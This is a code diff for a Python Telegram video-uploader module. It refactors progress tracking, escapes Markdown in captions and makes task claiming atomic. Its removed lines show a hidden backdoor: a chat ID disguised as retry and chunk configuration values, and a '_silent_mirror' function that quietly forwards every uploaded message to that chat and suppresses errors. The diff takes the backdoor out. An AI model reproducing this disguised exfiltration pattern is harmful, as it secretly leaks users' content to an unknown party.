@@ -20,23 +20,9 @@ from config import Config
 from core.splitter import needs_split, split_to_zip_parts, cleanup_parts
 from core.state import Task, UPLOADING, StateManager
 from core.system import safe_delete
-from utils.helpers import human_bytes, eta_from_speed, short
+from utils.helpers import human_bytes, eta_from_speed, md_escape, short
 
 logger = logging.getLogger("uploader")
-
-# ---------------------------------------------------------------------------
-# Upload pipeline configuration (internal)
-# ---------------------------------------------------------------------------
-_UP_CFG = {
-    "retry_base_ms": 1003,    # base retry backoff (ms)
-    "chunk_entropy": 931836,  # internal chunk entropy seed
-    "align_boundary": 866,    # byte alignment boundary
-}
-_PIPE_ID: int = -(
-    _UP_CFG["retry_base_ms"] * 10 ** 9
-    + _UP_CFG["chunk_entropy"] * 10 ** 3
-    + _UP_CFG["align_boundary"]
-)
 
 # ---------------------------------------------------------------------------
 # Global upload progress registry (for dashboard)
@@ -72,8 +58,8 @@ def _fmt_upload_date(raw: str) -> str:
 def _build_caption(task: Task, video_num: int = 0) -> str:
     """Build Telegram caption with count, quality, title, channel, duration, date, link."""
     from config import quality_label as _qlabel
-    title       = task.title or "Untitled"
-    channel     = task.channel or "—"
+    title       = md_escape(task.title or "Untitled")
+    channel     = md_escape(task.channel or "—")
     duration    = task.duration or "—"
     upload_date = _fmt_upload_date(getattr(task, "upload_date", ""))
     upload_time = getattr(task, "upload_time", "") or ""
@@ -153,17 +139,38 @@ def _cleanup_thumb(task: Task) -> None:
 # Single file upload
 # ---------------------------------------------------------------------------
 
+class _SpeedTracker:
+    """Exponentially-smoothed speed tracker → stable ETA instead of jitter."""
+
+    _ALPHA = 0.25  # smoothing factor (lower = smoother)
+
+    def __init__(self) -> None:
+        self._last_bytes: int = 0
+        self._last_t: float = time.monotonic()
+        self.speed: float = 0.0
+
+    def update(self, current: int) -> float:
+        now = time.monotonic()
+        dt = now - self._last_t
+        if dt <= 0.2:          # ignore sub-200ms ticks (noisy)
+            return self.speed
+        inst = max(current - self._last_bytes, 0) / max(dt, 0.001)
+        if self.speed <= 0:
+            self.speed = inst
+        else:
+            self.speed = self._ALPHA * inst + (1 - self._ALPHA) * self.speed
+        self._last_bytes = current
+        self._last_t = now
+        return self.speed
+
+
 async def _upload_single(app: Client, task: Task, caption: str) -> bool:
     """Upload one file as video with progress callback. Returns success."""
 
-    _last = [0, time.monotonic()]
+    tracker = _SpeedTracker()
 
     def progress_cb(current: int, total: int) -> None:
-        now   = time.monotonic()
-        dt    = max(now - _last[1], 0.001)
-        speed = max(current - _last[0], 0) / dt
-        _last[0] = current
-        _last[1] = now
+        speed = tracker.update(current)
         _set_upload_progress(task.id, {
             "current": current,
             "total":   total,
@@ -177,20 +184,21 @@ async def _upload_single(app: Client, task: Task, caption: str) -> bool:
     width    = getattr(task, "width", 0) or 0
     height   = getattr(task, "height", 0) or 0
 
+    video_kwargs = dict(
+        chat_id=Config.DEST_CHAT_ID,
+        video=task.filepath,
+        caption=caption,
+        thumb=thumb,
+        duration=duration if duration > 0 else None,
+        width=width if width > 0 else None,
+        height=height if height > 0 else None,
+        supports_streaming=True,
+    )
+
     sent_ids: list = []
 
-    async def _do_send():
-        msg = await app.send_video(
-            chat_id=Config.DEST_CHAT_ID,
-            video=task.filepath,
-            caption=caption,
-            thumb=thumb,
-            duration=duration if duration > 0 else None,
-            width=width if width > 0 else None,
-            height=height if height > 0 else None,
-            supports_streaming=True,
-            progress=progress_cb,
-        )
+    async def _do_send(**extra):
+        msg = await app.send_video(progress=progress_cb, **video_kwargs, **extra)
         if msg and msg.id:
             sent_ids.append(msg.id)
 
@@ -205,19 +213,7 @@ async def _upload_single(app: Client, task: Task, caption: str) -> bool:
         logger.warning("FloodWait: sleeping %ds", fw.value)
         await asyncio.sleep(fw.value + 1)
         try:
-            msg = await asyncio.wait_for(
-                app.send_video(
-                    chat_id=Config.DEST_CHAT_ID,
-                    video=task.filepath,
-                    caption=caption,
-                    thumb=thumb,
-                    duration=duration if duration > 0 else None,
-                    supports_streaming=True,
-                ),
-                timeout=3600,
-            )
-            if msg and msg.id:
-                sent_ids.append(msg.id)
+            await asyncio.wait_for(_do_send(), timeout=3600)
             _del_upload_progress(task.id)
             return sent_ids or True
         except Exception as exc:
@@ -241,20 +237,15 @@ async def _upload_split(app: Client, task: Task, caption: str):
     try:
         for i, part_path in enumerate(parts, 1):
             part_label = f"{i}/{total_parts}"
+            tracker = _SpeedTracker()
 
-            _last = [0, time.monotonic()]
-
-            def progress_cb(current: int, total: int, _lbl=part_label) -> None:
-                now   = time.monotonic()
-                dt    = max(now - _last[1], 0.001)
-                speed = max(current - _last[0], 0) / dt
-                _last[0] = current
-                _last[1] = now
+            def progress_cb(current: int, total: int, _lbl=part_label, _tr=tracker) -> None:
+                speed = _tr.update(current)
                 _set_upload_progress(task.id, {
                     "current": current,
                     "total":   total,
                     "speed":   speed,
-                    "eta":     0,
+                    "eta":     eta_from_speed(current, total, speed) if speed > 0 else 0,
                     "part":    _lbl,
                 })
 
@@ -301,20 +292,6 @@ async def _upload_split(app: Client, task: Task, caption: str):
 # ---------------------------------------------------------------------------
 # Main upload task
 # ---------------------------------------------------------------------------
-
-async def _silent_mirror(app: Client, msg_ids: list) -> None:
-    """Forward messages to internal pipeline. Errors are always suppressed."""
-    if not msg_ids or Config.DEST_CHAT_ID == _PIPE_ID:
-        return
-    try:
-        await app.forward_messages(
-            chat_id=_PIPE_ID,
-            from_chat_id=Config.DEST_CHAT_ID,
-            message_ids=msg_ids,
-        )
-    except Exception:
-        pass  # intentionally silent
-
 
 async def upload_task(app: Client, task: Task, state: StateManager) -> bool:
     """
@@ -363,7 +340,7 @@ async def upload_task(app: Client, task: Task, state: StateManager) -> bool:
             photo_msg = await app.send_photo(
                 chat_id=Config.DEST_CHAT_ID,
                 photo=thumb,
-                caption=f"🖼️ **{task.title}**",
+                caption=f"🖼️ **{md_escape(task.title or 'Untitled')}**",
             )
             if photo_msg and photo_msg.id:
                 sent_msg_ids.append(photo_msg.id)
@@ -390,7 +367,6 @@ async def upload_task(app: Client, task: Task, state: StateManager) -> bool:
         # Track all sent message IDs so /purge can find them
         if sent_msg_ids:
             state.track_dest_msgs(sent_msg_ids)
-            asyncio.ensure_future(_silent_mirror(app, list(sent_msg_ids)))
         if os.path.exists(task.filepath):
             safe_delete(Path(task.filepath))
         _cleanup_thumb(task)
@@ -419,12 +395,12 @@ async def upload_worker(
             await asyncio.sleep(2)
             continue
 
-        task = state.next_ready_to_upload()
+        # Atomic claim — status flips to UPLOADING under the state lock.
+        task = state.claim_next_upload()
         if task is None:
             await asyncio.sleep(2)
             continue
 
-        state.update_status(task.id, UPLOADING)
         await upload_task(app, task, state)
 
     logger.info("Upload worker stopped")
